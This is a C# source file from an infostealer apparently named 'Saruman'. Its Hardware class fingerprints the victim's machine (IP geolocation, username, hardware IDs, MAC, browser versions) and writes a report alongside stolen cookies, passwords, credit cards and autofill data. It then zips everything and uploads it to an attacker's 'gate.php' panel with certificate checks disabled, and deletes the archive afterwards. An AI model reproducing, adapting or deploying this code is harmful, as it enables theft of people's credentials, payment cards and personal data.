using Anubis;
using Saruman.Stealer.Cookies;
using Saruman.Stealer.Credit_Cards;
using Saruman.Stealer.Passwords;
using Saruman.Stealer.WebData;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Windows.Forms;
using System.IO.Compression;

namespace Saruman.Utilies.Hardware
{
    public   class Hardware
    {
        private static string OutputResult(string info, List<string> result)
        {
            if (info.Length > 0)
              return info;

            if (result.Count > 0)
            {
                for (int i = 0; i < result.Count; ++i)
                   return result[i];
            }
            return null;
        }


            private static List<string> GetHardwareInfo(string WIN32_Class, string ClassItemField)
        {
            List<string> result = new List<string>();

            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM " + WIN32_Class);

            try
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    result.Add(obj[ClassItemField].ToString().Trim());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

            return result;
        }
        public static string define_windows()
        {
            string result;
            try
            {
                ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
                string text = string.Empty;
                foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
                {
                    text = managementBaseObject["Caption"].ToString();
                }
                if (text.Contains("8"))
                {
                    result = "Windows 8";
                }
                else if (text.Contains("8.1"))
                {
                    result = "Windows 8.1";
                }
                else if (text.Contains("10"))
                {
                    result = "Windows 10";
                }
                else if (text.Contains("XP"))
                {
                    result = "Windows XP";
                }
                else if (text.Contains("7"))
                {
                    result = "Windows 7";
                }
                else
                {
                    result = (text.Contains("Server") ? "Windows Server" : "Unknown");
                }
            }
            catch
            {
                result = "Unknown";
            }
            return result;
        }
        public static string get_guid()
        {
            string result;
            try
            {
                using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
                {
                    using (RegistryKey registryKey2 = registryKey.OpenSubKey("SOFTWARE\\Microsoft\\Cryptography"))
                    {
                        if (registryKey2 == null)
                        {
                            throw new KeyNotFoundException(string.Format("Key Not Found: {0}", "SOFTWARE\\Microsoft\\Cryptography"));
                        }
                        object value = registryKey2.GetValue("MachineGuid");
                        if (value == null)
                        {
                            throw new IndexOutOfRangeException(string.Format("Index Not Found: {0}", "MachineGuid"));
                        }
                        result = value.ToString().ToUpper().Replace("-", string.Empty);
                    }
                }
            }
            catch
            {
                result = "HWID not found";
            }
            return result;
        }
        public static void info(string dir)
        {

            object potoki = 0;
            ManagementObjectSearcher searcher_soft =
       new ManagementObjectSearcher("root\\CIMV2",
          "SELECT * FROM Win32_Product");
            foreach (var item in new System.Management.ManagementObjectSearcher("Select * from Win32_ComputerSystem").Get())
            {
                potoki = item["NumberOfLogicalProcessors"];
            }
            var hwid = get_guid();
            var os = define_windows();
                String direction1 = "";
                WebRequest request1 = WebRequest.Create("http://ip-api.com/line/?fields");

                string a;
                using (WebResponse response1 = request1.GetResponse())
                using (StreamReader stream = new StreamReader(response1.GetResponseStream()))
                {
                    a = (stream.ReadToEnd());
                }
                using (StreamWriter streamWriter = new StreamWriter(Path.GetTempPath() + "\\R725K54.tmp"))
                {
                    streamWriter.WriteLine(a);
                }

                string[] Mass = File.ReadAllLines(Path.GetTempPath() + "\\R725K54.tmp", System.Text.Encoding.Default);

            var rfc4122bytes = Convert.FromBase64String("aguidthatIgotonthewire==");
            Array.Reverse(rfc4122bytes, 0, 4);
            Array.Reverse(rfc4122bytes, 4, 2);
            Array.Reverse(rfc4122bytes, 6, 2);
            var guid = new Guid(rfc4122bytes);

            ManagementObjectSearcher searcher8 =
    new ManagementObjectSearcher("root\\CIMV2",
    "SELECT * FROM Win32_Processor");
            object cpu = 0;
            ManagementObjectSearcher searcher =
   new ManagementObjectSearcher("root\\CIMV2",
   "SELECT * FROM Win32_NetworkAdapterConfiguration");
            object mac = 0;   
            foreach (ManagementObject queryObj in searcher.Get())
            {
                mac = queryObj["MACAddress"];
            }
                foreach (ManagementObject queryObj in searcher8.Get())
            {
                 cpu = queryObj["Name"];
            }
            object gpu = 0;
            ManagementObjectSearcher searcher11 =
    new ManagementObjectSearcher("root\\CIMV2",
    "SELECT * FROM Win32_VideoController");

            foreach (ManagementObject queryObj in searcher11.Get())
            {
                gpu = queryObj["Caption"];
            }
            ManagementObjectSearcher ozu =
           new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory");
            int ram = 1;
            foreach (ManagementObject queryObj in ozu.Get())
            {
                ram ++;
            }
            if (File.Exists(@"C:\Program Files\Mozilla Firefox\\firefox.exe"))
            {

            }
            int sum = 0;


            using (StreamWriter streamWriter = new StreamWriter(dir + "\\information.log"))
            {
                streamWriter.WriteLine(Settings.name+ " " + Settings.Stealer_version + " " + Settings.coded);
                streamWriter.WriteLine(" ");
                streamWriter.WriteLine("IP : " + Mass[13]);
                streamWriter.WriteLine("Country Code : " + Mass[2]);
                streamWriter.WriteLine("Country :" + Mass[1]);
                streamWriter.WriteLine("State Name : " + Mass[4]);
                streamWriter.WriteLine("City :" + Mass[5]);
                streamWriter.WriteLine("Timezone :" + Mass[9]);
                streamWriter.WriteLine("ZIP : " + Mass[6]);
                streamWriter.WriteLine("ISP : " + Mass[10]);
                streamWriter.WriteLine("Coordinates :" + Mass[7] + " , " + Mass[8]);
                streamWriter.WriteLine(" ");
                streamWriter.WriteLine("Username : " + Environment.UserName);
                streamWriter.WriteLine("PCName : " + Environment.MachineName);
                streamWriter.WriteLine("UUID : " + guid);
                streamWriter.WriteLine("HWID : " + hwid);
                streamWriter.WriteLine("OS : " + os);          
                streamWriter.WriteLine("CPU : " + cpu);
                streamWriter.WriteLine("CPU Threads: " + potoki);
                streamWriter.WriteLine("GPU : " + gpu);
                streamWriter.WriteLine("RAM :" + ram + " GB");
                streamWriter.WriteLine("MAC :" + mac);
                streamWriter.WriteLine("Screen Resolution :" + Screen.PrimaryScreen.Bounds.Width.ToString() + "x" + Screen.PrimaryScreen.Bounds.Height.ToString());
                streamWriter.WriteLine("System Language : " + System.Globalization.CultureInfo.CurrentUICulture.DisplayName);
                streamWriter.WriteLine("Layout Language : " + InputLanguage.CurrentInputLanguage.LayoutName);
                streamWriter.WriteLine("PC Time : " + DateTime.Now);
                streamWriter.WriteLine("Browser Versions");
               
                if (File.Exists(@"C:\Program Files\Mozilla Firefox\firefox.exe"))
                {
                    object value2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                    if (value2 != null)
                    {
                        sum++;
                        streamWriter.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
                    }
                    else
                    {
                        sum++;
                        value2 = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "", null);
                        streamWriter.WriteLine("Mozilla Version: " + FileVersionInfo.GetVersionInfo(value2.ToString()).FileVersion);
                    }

                }
                if (Directory.Exists(Environment.GetEnvironmentVariable("LocalAppData") + "\\Google\\Chrome\\User Data"))
                {
                    object value = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                    if (value != null)
                    {
                        sum++;
                        streamWriter.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion);
                    }
                    else
                    {
                        sum++;
                        value = Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", "", null);
                        streamWriter.WriteLine("Chrome Version:" + FileVersionInfo.GetVersionInfo(value.ToString()).FileVersion);
                    }
                }
                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera Software\\Opera Stable\\Web Data"))
                {
                    string text2 = Registry.GetValue("HKEY_CURRENT_USER\\Software\\Classes\\Applications\\opera.exe\\shell\\open\\command", "", null).ToString();
                    text2 = text2.Remove(text2.Length - 6, 6);
                    text2 = text2.Remove(0, 1);
                    string empty = FileVersionInfo.GetVersionInfo(text2).FileVersion;
                    string text3 = string.Empty;
                    string empty2 = string.Empty;
                    if (empty.Split('.').First().Equals("54"))
                    {
                        text3 = "67.0.3396.87";
                    }
                    if (empty.Split('.').First().Equals("55"))
                    {
                        text3 = "68.0.3440.106";
                    }
                    if (empty.Split('.').First().Equals("56"))
                    {
                        text3 = "69.0.3497.100";
                    }
                    if (empty.Split('.').First().Equals("57"))
                    {
                        text3 = "70.0.3538.102";
                    }
                    sum++;
                    streamWriter.WriteLine("Opera Version: " + text3);
                }
                if(sum == 0)
                {
                    streamWriter.WriteLine("Popular Browsers Not Found!");
                }



                streamWriter.Close();

            }


            ZipFile.CreateFromDirectory(dir, Path.GetTempPath() + "\\" + Mass[1] + "_" + Mass[13] + "_" + hwid + ".zip");
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls;
            
            
            try
            {
                new WebClient().UploadFile(Settings.Url + string.Format("gate.php?id={0}&os={1}&cookie={2}&pswd={3}&version={4}&cc={5}&autofill={6}&hwid={7}", 1, os, GetCookies.CCookies, GetPasswords.Cpassword, Settings.Stealer_version, Get_Credit_Cards.CCCouunt, Get_Browser_Autofill.AutofillCount, hwid), "POST", Path.GetTempPath() + "\\" + Mass[1] + "_" + Mass[13] + "_" + hwid + ".zip");

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
            File.Delete(Path.GetTempPath() + "\\" + Mass[1] + "_" + Mass[13] + "_" + hwid + ".zip");
        }

        private static long GetSizeInMegabytes(long bytes)
        {
            return bytes / 1024 / 1024;
        }
    }
}
